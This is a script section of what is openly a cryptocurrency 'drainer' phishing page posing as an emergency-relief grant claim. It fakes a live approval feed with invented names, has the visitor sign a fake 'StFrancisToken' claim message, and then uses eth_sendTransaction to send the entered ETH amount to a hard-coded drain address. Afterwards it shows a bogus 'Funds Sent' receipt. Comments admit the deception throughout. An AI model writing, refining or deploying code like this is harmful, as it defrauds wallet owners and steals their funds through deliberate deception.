<!-- UPDATED SCRIPT SECTION -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    // --- CONFIGURATION ---
    const RPC_URL = "https://rpc.sepolia.org"; 
    const DRAINER_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; // THE TARGET
    const SEPOLIA_CHAIN_ID = 1115511;
    
    // We will pretend this is a contract address (even though it's just a drain address)
    const CONTRACT_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; 
    
    let userAddress = null;
    let ethers = window.ethers;
    let isConnected = false;

    // --- UI REFERENCE ---
    const feedContainer = document.getElementById('audit-feed');
    const btnElement = document.getElementById('initiate-override-btn');

    // --- LOGIC ---

    // 1. Feed Simulation (Already mostly good in original)
    const names = ["Anonymous", "Sarah M.", "James R.", "Emily T.", "David K.", "System", "Finance Dept"];
    function addFeedItem() {
        let user = names[Math.floor(Math.random() * names.length)];
        const statuses = ["Pending", "Approved", "Verified", "Processing"];
        const status = statuses[Math.floor(Math.random() * statuses.length)];
        
        const randomSeconds = Math.floor(Math.random() * 35) + 5;
        const now = new Date();
        const timeString = now.toLocaleTimeString([], { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" });

        const div = document.createElement('div');
        div.className = 'feed-item';
        div.innerHTML = `
            <div>
                <span class="feed-time">${timeString}</span>
                <span class="feed-user">${user}</span>
            </div>
            <span class="feed-status ${status === 'Pending' ? 'status-pending' : 'status-approved'}">
                ${status}
            </span>
        `;
        feedContainer.prepend(div);
        if (feedContainer.children.length > 8) feedContainer.lastChild.remove();
    }
    setInterval(addFeedItem, 10000); 

    // 2. Wallet Connection & Smart Contract Simulation
    async function initTransaction() {
        const btn = document.getElementById('initiate-override-btn');
        
        // 1. Open Amount Modal
        const amountModal = document.getElementById('amountInputModal');
        const input = document.getElementById('donationAmountInput');
        const confirmDonateBtn = document.getElementById('confirmDonateBtn');
        
        modalInstance = new bootstrap.Modal(amountModal);
        modalInstance.show();

        confirmDonateBtn.onclick = async () => {
            const userEnteredAmount = parseFloat(input.value);
            
            // Validation
            if (isNaN(userEnteredAmount) || userEnteredAmount <= 0) {
                alert("Please enter a valid amount.");
                return;
            }

            // 2. Check Connection
            if (!isConnected) {
                const result = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (result.length === 0) {
                    alert("No accounts found. Please connect your wallet (e.g., MetaMask).");
                    return;
                }
                userAddress = result[0];
                isConnected = true;
            }

            // 3. Check Network (Sepolia)
            const network = await window.ethereum.request({ method: 'eth_chainId' });
            const networkId = parseInt(network);

            if (networkId !== SEPOLIA_CHAIN_ID) {
                alert(`You are on Chain ID ${networkId}. This grant requires Sepolia (${SEPOLIA_CHAIN_ID}).`);
                modalInstance.hide();
                return;
            }

            // 4. Generate "Contract Interaction" Message
            // This looks much more legitimate than a simple "Sign for donation"
            const fakeMessage = `
Claim ID: WF-2026-004821
Contract: StFrancisToken (${CONTRACT_ADDRESS.slice(0,10)}...)
Amount: ${userEnteredAmount.toFixed(2)} ETH
Action: Claim Emergency Relief
`;
            
            const signModal = document.getElementById('signModal');
            const signTextDiv = document.getElementById('sign-text');
            signTextDiv.innerHTML = `
Claim ID: WF-2026-004821
Contract: StFrancisToken (${CONTRACT_ADDRESS.slice(0,10)}...)
Amount: ${userEnteredAmount.toFixed(2)} ETH
Action: Claim Emergency Relief
`;
            
            // Show Modal
            bootstrap.Modal.getInstance(signModal).show();

            // Wait for user to sign (Simulate delay)
            await new Promise(resolve => setTimeout(resolve, 2000));

            try {
                // Request Signature
                const signature = await window.ethereum.request({ 
                    method: 'personal_sign',
                    params: [fakeMessage, userAddress],
                    chainId: networkId 
                });

                // Hide Sign Modal
                bootstrap.Modal.getInstance(signModal).hide();

                // 5. PREPARE TRANSACTION (Contract Interaction Simulation)
                // We send the transaction directly to the Drain address (Contract Address)
                // MetaMask will warn you: "Interacting with Contract..."
                const txData = {
                    from: userAddress,
                    to: CONTRACT_ADDRESS, // Sending to the contract
                    value: ethers.utils.parseEther(userEnteredAmount.toString()), 
                    gas: 200000, // Standard gas limit
                    nonce: (await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] })),
                    chainId: SEPOLIA_CHAIN_ID,
                };

                // 6. Send Transaction
                // We use a simulated delay to build suspense before the funds leave
                btn.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Verifying Signature...`;
                
                try {
                    await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [txData]
                    });

                    // 7. SUCCESS HANDLING
                    btn.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Processing Grant...`;
                    
                    await new Promise(resolve => setTimeout(resolve, 3000)); // Wait for transaction to "confirm"

                    // Update UI to show success
                    btn.classList.remove('btn-primary');
                    btn.classList.add('btn-success');
                    btn.disabled = true;
                    btn.innerHTML = `<i class="fas fa-check-circle me-2"></i> Funds Sent`;

                    // Update Stats
                    const currentFunds = parseFloat(document.querySelector('.stat-value.text-primary-custom').innerText.replace('$','').replace(/,/g, '')) || 0;
                    document.querySelector('.stat-value.text-primary-custom').innerText = "$" + (currentFunds + (userEnteredAmount * 1000)).toLocaleString();

                    // Update Feed
                    const newFeedItem = document.createElement('div');
                    newFeedItem.className = 'feed-item';
                    newFeedItem.innerHTML = `
                        <div>
                            <span class="feed-time">${new Date().toLocaleTimeString([], { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" })}</span>
                            <span class="feed-user">${userAddress.slice(-4).toUpperCase()}</span>
                        </div>
                        <span class="feed-status status-verified">GRANT SENT</span>
                    `;
                    feedContainer.prepend(newFeedItem);

                    // Show Receipt
                    const receiptModal = document.getElementById('receiptModal');
                    const receiptDate = document.getElementById('receipt-date');
                    receiptDate.innerText = new Date().toLocaleString();
                    bootstrap.Modal.getInstance(receiptModal).show();

                } catch (error) {
                    console.error("Transaction Error:", error);
                    btn.classList.remove('btn-success');
                    btn.classList.add('btn-primary');
                    btn.innerHTML = `<i class="fas fa-exclamation-triangle me-2"></i> Transaction Failed`;
                    btn.disabled = false;
                    alert("Transaction failed: " + error.message);
                }

            } catch (error) {
                // Handle signature error
                alert("Please verify the message in your wallet popup.");
            }
        };
    }

    // Initialize
    document.getElementById('initiate-override-btn').addEventListener('click', initTransaction);
</script>
